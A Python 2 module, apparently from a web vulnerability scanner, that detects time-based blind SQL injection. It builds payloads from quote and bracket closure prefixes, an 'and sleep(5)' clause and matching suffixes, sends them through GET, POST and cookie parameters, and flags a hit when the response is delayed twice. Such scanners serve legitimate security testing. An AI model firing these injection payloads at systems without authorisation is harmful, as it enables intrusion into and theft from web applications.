import re
import time

import lunaexp
import output
import conf.lunaconf

luna_output = output.output()
luna_conf = conf.lunaconf.lunaconf()

class sqli(lunaexp.base):

    ruleid = 0x0200

    method = ['GET','POST','COOKIE']
    key_exp = ''
    value_exp = ''

    closure_prefix = ["' ","\" ",") ","') ","\") ","'\" ","\"' ","%' ","%\" "]
    closere_suffix = [" and 'a'='a"," and \"a\"=\"a"," and 1 in (1"," and ('a')=('a"," and (\"a=\")=(\"a"," and \"'a'\"=\"'a"," and '\"a\"'='\"a"," and '%'='"," and \"%\"=\""]
    closere_suffix_general = [" --"," #"," /*"]

    time_base_delaytime = 5
    time_base_exp = ["and sleep("+str(time_base_delaytime)+")"]

    time_base_times = 5
    time_base_average = 0

    content_type_whitelist = []

    rule_type = "sqli-main"
    match_with = "sqli.time_based"

    options = 0xF1

   
    def scan_main(self,luna_scan,luna_report,scan_type,urlencode_type):                                                        #user_define
        exp = "err_sqli"
        module = __import__("exp.sql."+exp,{},{},list(exp))
        exp_obj = getattr(module, exp)()
        errsqli_vul = exp_obj.scan(luna_scan,luna_report)
        if errsqli_vul:
            return True

        for i,closure_prefix in enumerate(self.closure_prefix):
            self.value_exp = closure_prefix+self.time_base_exp[0] + self.closere_suffix[i]
            print self.value_exp
            a= time.time()
            status,header,data = luna_scan.scan_for_all(self,0,scan_type,urlencode_type)
            b= time.time()
            time_dif = b-a
            if time_dif - self.time_base_average > self.time_base_delaytime-1:
                a= time.time()
                status,header,data = luna_scan.scan_for_all(self,0,scan_type,urlencode_type)
                b= time.time()
                time_dif = b-a
                if time_dif - self.time_base_average > self.time_base_delaytime-1:
                    luna_output.vul_xss_output("[","time_based_sqli found","]")
                    luna_report.report_http(luna_scan,self)

                    return True

